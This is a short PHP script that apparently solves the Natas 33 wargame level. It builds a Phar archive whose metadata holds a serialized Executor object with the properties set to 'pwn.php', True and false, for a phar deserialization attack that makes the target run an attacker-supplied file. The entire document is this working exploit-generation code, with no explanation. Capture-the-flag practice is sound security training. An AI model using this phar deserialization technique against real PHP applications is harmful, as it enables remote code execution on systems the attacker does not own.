<?php
	class Executor {
		private $filename = "pwn.php";
        	private $signature = True;
        	private $init = false;
	}

	$phar = new Phar("natas33.phar");
	$phar->startBuffering();
	$phar->addFromString("pwn.txt", 'pwn');
	$phar->setStub("<?php __HALT_COMPILER(); ?>");
	$o = new Executor();
	$phar->setMetadata($o);
	$phar->stopBuffering();
?>
